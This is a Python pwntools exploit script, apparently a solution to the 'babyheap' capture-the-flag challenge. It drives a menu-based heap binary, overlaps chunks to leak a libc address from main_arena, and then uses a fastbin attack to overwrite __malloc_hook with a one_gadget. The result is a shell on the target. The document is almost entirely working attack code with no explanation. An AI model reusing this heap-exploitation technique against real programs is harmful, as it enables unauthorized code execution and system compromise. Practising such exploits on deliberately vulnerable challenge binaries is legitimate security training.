from pwn import *
p = process("./babyheap")
#p = remote("node5.buuoj.cn",26564)
context(log_level="debug",arch="amd64")
elf = ELF("babyheap")

def debug():
    gdb.attach(p)
    pause()

def allocated(size):
    p.recvuntil(b"Command: ")
    p.sendline(b"1")
    p.recvuntil(b"Size: ")
    p.sendline(str(size))

def fill(index,size,content):
    p.recvuntil(b"Command: ")
    p.sendline(b"2")
    p.recvuntil(b"Index: ")
    p.sendline(str(index))
    p.recvuntil(b"Size: ")
    p.sendline(str(size))
    p.recvuntil(b"Content: ")
    p.sendline(content)

def free(index):
    p.recvuntil(b"Command: ")
    p.sendline(b"3")
    p.recvuntil(b"Index: ")
    p.sendline(str(index))

def dump(index):
    p.recvuntil(b"Command: ")
    p.sendline(b"4")
    p.recvuntil(b"Index: ")
    p.sendline(str(index))

allocated(0x10)  #chunk0
allocated(0x10)  #chunk1
allocated(0x10)  #chunk2    
allocated(0x10)  #chunk3
allocated(0x80)  #chunk4
allocated(0x80)  #chunk5
free(1)
free(2)
payload1=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
fill(0,len(payload1),payload1)
payload2=p64(0)*3+p64(0x21)
fill(3,len(payload2),payload2)
#debug()
allocated(0x10)
allocated(0x10)
debug()
payload3=p64(0)*3+p64(0x91)
fill(3,len(payload3),payload3)
free(4)
dump(2)
main_area88=u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print(hex(main_area88))
main_area=main_area88-88
malloc_hook=main_area-0x10
libc = ELF("./libc-2.23.so")
libc_base = malloc_hook-libc.sym["__malloc_hook"]
sys_addr = libc_base+0x4526a
allocated(0x60)
free(4)
payload4=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)
fill(3,len(payload4),payload4)
allocated(0x60)
allocated(0x60)
payload5=p64(0)*2+p8(0)*3+p64(sys_addr)
fill(6,len(payload5),payload5)
allocated(1)
p.interactive()
#debug()
